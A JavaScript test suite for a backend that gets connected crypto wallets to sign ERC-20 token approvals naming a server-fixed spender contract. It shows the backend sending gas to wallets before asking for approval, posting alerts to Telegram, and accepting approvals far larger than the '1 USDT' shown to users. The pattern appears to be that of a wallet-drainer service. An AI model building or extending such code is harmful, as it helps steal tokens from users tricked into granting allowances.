const { test, beforeEach } = require("node:test");
const assert = require("node:assert/strict");
const env = require("../config/env");
const { createApp } = require("../app");
const sessionStore = require("../storage/sessions");
const paymentStore = require("../storage/payments");
const { createPayment, assertNoClientOverrides } = require("../services/paymentService");
const { requestApproval, evmApproveTransaction } = require("../services/approvalService");
const { approvalDelayAfterTopup } = require("../config/evmGas");
const { verifyPaymentTransaction } = require("../services/transactionVerifier");
const { encodeErc20Approve, allowanceUnits } = require("../utils/helpers");
const { ValidationError, ConfigurationError, NotFoundError } = require("../utils/errors");

const TOKEN = "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const CARD = "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
const WALLET = "0xcccccccccccccccccccccccccccccccccccccccc";

function seedContracts() {
    env.ETH_USDT_CONTRACT = TOKEN;
    env.ETH_CARD_CONTRACT = CARD;
    env.BSC_USDT_CONTRACT = TOKEN;
    env.BSC_CARD_CONTRACT = CARD;
    env.TRON_USDT_CONTRACT = "";
    env.TRON_CARD_CONTRACT = "";
}

function seedSession(connectionId = `conn-${Date.now()}-${Math.random()}`) {
    return sessionStore.addSession({
        connectionId,
        status: "settled",
        sessionTopic: `topic-${connectionId}`,
        topic: `topic-${connectionId}`,
        accounts: [
            {
                account: `eip155:1:${WALLET}`,
                namespace: "eip155",
                chainId: "eip155:1",
                address: WALLET
            }
        ],
        balances: [
            {
                network: "eth",
                chainId: "eip155:1",
                address: WALLET,
                native: { symbol: "ETH", balance: "1", raw: "1000000000000000000", decimals: 18 },
                usdt: { symbol: "USDT", balance: "2", raw: "2000000", decimals: 6 }
            }
        ]
    });
}

const gasOk = {
    sufficient: true,
    needFunding: false,
    network: "eth",
    nativeSymbol: "ETH",
    currentBalance: "1",
    currentBalanceRaw: "1000000000000000000",
    estimatedRequired: "0.001",
    estimatedRequiredRaw: "1000000000000000",
    recommendedFunding: "0.0012",
    estimatedGas: "21000"
};

function listen(app) {
    return new Promise((resolve) => {
        const server = app.listen(0, "127.0.0.1", () => resolve(server));
    });
}

async function httpJson(server, method, url, body) {
    const address = server.address();
    const response = await fetch(`http://127.0.0.1:${address.port}${url}`, {
        method,
        headers: body === undefined
            ? {}
            : { "Content-Type": "application/json" },
        body: body === undefined ? undefined : JSON.stringify(body)
    });
    const payload = await response.json();
    return { status: response.status, payload };
}

beforeEach(() => {
    paymentStore.reset();
    seedContracts();
    env.TELEGRAM_BOT_TOKEN = "";
    env.TELEGRAM_CHAT_ID = "";
});

test("1. payment creation returns spender, token, and 1 USDT allowance", async () => {
    const session = seedSession();
    const payment = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    assert.equal(payment.token, "USDT");
    assert.equal(payment.tokenContract, TOKEN);
    assert.equal(payment.spender, CARD);
    assert.equal(payment.allowance, "1 USDT");
    assert.equal(payment.status, "created");
    assert.equal(payment.allowanceRaw, String(1n * allowanceUnits(6)));
});

test("2. unsupported network is rejected", async () => {
    const session = seedSession();
    await assert.rejects(
        () => createPayment({ connectionId: session.connectionId, network: "solana" }),
        ValidationError
    );
});

test("3. missing contract configuration is rejected", async () => {
    env.ETH_CARD_CONTRACT = "";
    const session = seedSession();
    await assert.rejects(
        () => createPayment({ connectionId: session.connectionId }, { checkGasSufficiency: async () => gasOk }),
        ConfigurationError
    );
});

test("4. invalid connection is rejected", async () => {
    await assert.rejects(
        () => createPayment({ connectionId: "missing-session" }, { checkGasSufficiency: async () => gasOk }),
        NotFoundError
    );
});

test("5. allowance above 1 USDT cannot be supplied by the client", () => {
    assert.throws(
        () => assertNoClientOverrides({ allowance: "100 USDT" }),
        ValidationError
    );
});

test("6. frontend-supplied spender is rejected", () => {
    assert.throws(
        () => assertNoClientOverrides({ spender: CARD }),
        ValidationError
    );
});

test("7. frontend-supplied token contract is rejected", () => {
    assert.throws(
        () => assertNoClientOverrides({ tokenContract: TOKEN }),
        ValidationError
    );
});

test("8. approval request creation sends a wallet request once", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    let sent = 0;
    const payment = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        checkGasSufficiency: async () => gasOk,
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        },
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    });

    assert.equal(sent, 1);
    assert.equal(payment.status, "verified");
    assert.equal(payment.transactionHash, "0xhash");
});

test("TRON approval is not sent when that wallet only has ETH USDT", async () => {
    const session = seedSession();
    sessionStore.updateSession(session.connectionId, {
        accounts: [
            ...session.accounts,
            {
                account: "tron:0x2b6653dc:TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
                namespace: "tron",
                chainId: "tron:0x2b6653dc",
                address: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
            }
        ],
        balances: [
            ...session.balances,
            {
                network: "tron",
                chainId: "tron:0x2b6653dc",
                address: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
                native: { symbol: "TRX", balance: "20", raw: "20000000", decimals: 6 },
                usdt: { symbol: "USDT", balance: "0", raw: "0", decimals: 6 }
            }
        ]
    });
    env.TRON_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    env.TRON_CARD_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
    const tronPayment = paymentStore.addPayment({
        connectionId: session.connectionId,
        network: "tron",
        tokenContract: env.TRON_USDT_CONTRACT,
        spender: env.TRON_CARD_CONTRACT,
        allowance: "1",
        allowanceRaw: "1000000",
        decimals: 6,
        chainId: "tron:0x2b6653dc",
        status: "created",
        gasSufficient: true
    });
    let sent = 0;

    await assert.rejects(
        () => requestApproval(tronPayment.paymentId, {
            wait: true,
            client: {},
            checkGasSufficiency: async () => gasOk,
            sendWalletApproval: async () => {
                sent += 1;
                return "fake-tron";
            }
        }),
        /does not have enough USDT/
    );

    assert.equal(sent, 0);
    assert.equal(paymentStore.getPayment(tronPayment.paymentId).status, "failed");
});

test("approval request is not sent a second time for the same payment", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    let sent = 0;
    const deps = {
        wait: true,
        client: {},
        checkGasSufficiency: async () => gasOk,
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        },
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    };

    await requestApproval(created.paymentId, deps);
    await requestApproval(created.paymentId, deps);
    assert.equal(sent, 1);
});

test("parallel approval requests on one network send once", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    let release;
    const hold = new Promise((resolve) => {
        release = resolve;
    });
    let sent = 0;
    const deps = {
        wait: true,
        client: {},
        checkGasSufficiency: async () => {
            await hold;
            return gasOk;
        },
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        },
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    };

    const first = requestApproval(created.paymentId, deps);
    const second = requestApproval(created.paymentId, deps);
    await Promise.resolve();
    release();
    await Promise.all([first, second]);
    assert.equal(sent, 1);
});

test("9. approval rejection is recorded and not retried", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    const payment = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        checkGasSufficiency: async () => gasOk,
        sendWalletApproval: async () => {
            const error = new Error("User rejected the request");
            error.code = 4001;
            throw error;
        }
    });

    assert.equal(payment.status, "rejected");
    assert.equal(paymentStore.getPayment(created.paymentId).status, "rejected");
});

test("11. low native gas does not send the approval request", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    let sent = 0;
    await assert.rejects(
        () => requestApproval(created.paymentId, {
            wait: true,
            client: {},
            checkGasSufficiency: async () => ({
                sufficient: false,
                network: "eth",
                nativeSymbol: "ETH",
                currentBalance: "0",
                estimatedRequired: "0.001",
                reason: "Could not confirm live ETH on Ethereum."
            }),
            sendWalletApproval: async () => {
                sent += 1;
                return "0xhash";
            }
        }),
        ValidationError
    );

    assert.equal(sent, 0);
    assert.equal(paymentStore.getPayment(created.paymentId).status, "awaiting_gas");
});

test("BEP20 approval is a contract call, not a 0 BNB send to USDT", () => {
    const tx = evmApproveTransaction(
        "bsc",
        "0x962bd00000000000000000000000000000fd0670",
        "0x55d398326f99059ff775485246999027b3197955",
        "0x095ea7b3"
    );
    const eth = evmApproveTransaction(
        "eth",
        "0x5d041000000000000000000000000000009bc2e3",
        "0xdac17f958d2ee523a2206206994597c13d831ec7",
        "0x095ea7b3"
    );

    assert.equal(tx.to, "0x55d398326f99059fF775485246999027B3197955");
    assert.equal(tx.value, "0x0");
    assert.equal(tx.gas, undefined);
    assert.equal(tx.data, "0x095ea7b3");
    assert.equal(eth.value, "0x0");
    assert.equal(eth.to, "0xdAC17F958D2ee523a2206206994597C13D831ec7");
});

test("approval delay is 7s on BEP20 and ETH, and 12s on TRC", () => {
    assert.equal(approvalDelayAfterTopup("bsc"), 7000);
    assert.equal(approvalDelayAfterTopup("eth"), 7000);
    assert.equal(approvalDelayAfterTopup("tron"), 12000);
});

test("top-up hash does not open the approval until the gas has arrived", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    paymentStore.updatePayment(created.paymentId, {
        status: "awaiting_gas",
        gasSufficient: false,
        gasFundingTxHash: "0xabc",
        gasBalanceBeforeRaw: "0",
        gasFundedAt: new Date(Date.now() - 10000).toISOString()
    });

    let sent = 0;
    let reads = 0;
    const waiting = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        checkGasSufficiency: async () => {
            reads += 1;
            return {
                sufficient: false,
                needFunding: true,
                network: "eth",
                currentBalance: "0",
                currentBalanceRaw: "0",
                estimatedRequired: "0.01",
                estimatedRequiredRaw: "10000000000000000"
            };
        },
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        }
    });

    assert.equal(waiting.waitingForGas, true);
    assert.equal(sent, 0);
    assert.equal(reads, 1);

    const { waitUntilGasArrived } = require("../services/gasFunding");
    let polls = 0;
    const live = await waitUntilGasArrived(created.paymentId, {
        approvalDelayMs: 0,
        gasArrivalPollMs: 5,
        gasArrivalTimeoutMs: 200,
        checkGasSufficiency: async () => {
            polls += 1;
            if (polls < 3) {
                return {
                    sufficient: false,
                    needFunding: true,
                    network: "eth",
                    currentBalanceRaw: "0"
                };
            }
            return gasOk;
        }
    });
    assert.equal(live.sufficient, true);
    assert.ok(polls >= 3);

    const payment = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        checkGasSufficiency: async () => gasOk,
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        },
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    });

    assert.equal(sent, 1);
    assert.equal(payment.status, "verified");
});

test("approval stays closed when ETH is still zero after a top-up hash", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    paymentStore.updatePayment(created.paymentId, {
        status: "awaiting_gas",
        gasSufficient: false,
        gasFundingTxHash: "0xtopup",
        gasBalanceBeforeRaw: "0",
        gasFundedAt: new Date().toISOString()
    });

    let sent = 0;
    const waiting = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        checkGasSufficiency: async () => ({
            sufficient: true,
            needFunding: false,
            network: "eth",
            currentBalance: "0",
            currentBalanceRaw: "0",
            estimatedRequired: "0.01",
            estimatedRequiredRaw: "10000000000000000"
        }),
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        }
    });

    assert.equal(waiting.waitingForGas, true);
    assert.equal(sent, 0);
});

test("a stale gas reading does not open the approval before the top-up arrives", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    paymentStore.updatePayment(created.paymentId, {
        status: "awaiting_gas",
        gasSufficient: false,
        gasFundingTxHash: "0xabc",
        gasBalanceBeforeRaw: gasOk.currentBalanceRaw,
        gasFundedAt: new Date().toISOString()
    });

    let sent = 0;
    const waiting = await requestApproval(created.paymentId, {
        wait: true,
        client: {},
        gasAlreadyArrived: true,
        checkGasSufficiency: async () => gasOk,
        sendWalletApproval: async () => {
            sent += 1;
            return "0xhash";
        }
    });

    assert.equal(waiting.waitingForGas, true);
    assert.equal(sent, 0);
});

test("tiny live ETH does not send WalletConnect approval even if estimate says sufficient", async () => {
    const session = seedSession();
    const created = await createPayment({
        connectionId: session.connectionId
    }, { checkGasSufficiency: async () => gasOk });

    let sent = 0;
    await assert.rejects(
        () => requestApproval(created.paymentId, {
            wait: true,
            client: {},
            checkGasSufficiency: async () => ({
                sufficient: true,
                needFunding: false,
                network: "eth",
                nativeSymbol: "ETH",
                currentBalance: "0.000053",
                currentBalanceRaw: "53694189976646",
                estimatedRequired: "0.000006",
                estimatedRequiredRaw: "6354727416660",
                reason: "Live native balance covers the 1 USDT approval gas."
            }),
            sendWalletApproval: async () => {
                sent += 1;
                return "0xhash";
            }
        }),
        ValidationError
    );

    assert.equal(sent, 0);
    assert.equal(paymentStore.getPayment(created.paymentId).status, "awaiting_gas");
});

test("10. transaction verification accepts matching approve and rejects mismatches", async () => {
    const payment = {
        network: "eth",
        tokenContract: TOKEN,
        spender: CARD
    };

    const valid = await verifyPaymentTransaction(payment, "0xabc", {
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    });

    assert.equal(valid.valid, true);

    const wrongSpender = await verifyPaymentTransaction(payment, "0xabc", {
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(WALLET, 1n * allowanceUnits(6))
            };
        }
    });

    assert.equal(wrongSpender.valid, false);
});

test("ETH receipt status 1 is treated as success", async () => {
    const payment = {
        network: "eth",
        tokenContract: TOKEN,
        spender: CARD
    };

    const valid = await verifyPaymentTransaction(payment, "0xabc", {
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: 1 };
            }

            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, 1n * allowanceUnits(6))
            };
        }
    });

    assert.equal(valid.valid, true);
});

test("Trust Wallet nested hash is accepted as the approval tx", async () => {
    const { extractTxHash } = require("../services/approvalService");
    const hash = "0xc71f3cdf6925343bc7ad6b6a9621056d400fcaed358f31e5f930faf4c5bee754";
    assert.equal(extractTxHash({ result: { hash } }), hash);
    assert.equal(extractTxHash({ hash }), hash);
});

test("ETH approve above CARD_APPROVE_USDT still verifies when spender matches", async () => {
    const payment = {
        network: "eth",
        tokenContract: TOKEN,
        spender: CARD
    };
    const huge = 10000n * (10n ** 18n);
    const valid = await verifyPaymentTransaction(payment, "0xabc", {
        rpc: async (_url, method) => {
            if (method === "eth_getTransactionReceipt") {
                return { status: "0x1" };
            }
            return {
                to: TOKEN,
                input: encodeErc20Approve(CARD, huge)
            };
        }
    });
    assert.equal(valid.valid, true);
});

test("HTTP routes reject extra spender and create a payment", async () => {
    const app = createApp();
    const server = await listen(app);
    const session = seedSession();

    try {
        const blocked = await httpJson(server, "POST", "/api/payment/create", {
            connectionId: session.connectionId,
            network: "eth",
            spender: CARD
        });
        assert.equal(blocked.status, 400);

        const created = await httpJson(server, "POST", "/api/payment/create", {
            connectionId: session.connectionId
        });
        assert.equal(created.status, 201);
        assert.equal(created.payload.payment.spender, CARD);
        assert.equal(created.payload.payment.allowance, "1 USDT");

        const fetched = await httpJson(server, "GET", `/api/payment/${created.payload.payment.paymentId}`);
        assert.equal(fetched.status, 200);
        assert.equal(fetched.payload.payment.allowance, "1 USDT");
    } finally {
        await new Promise((resolve) => server.close(resolve));
    }
});
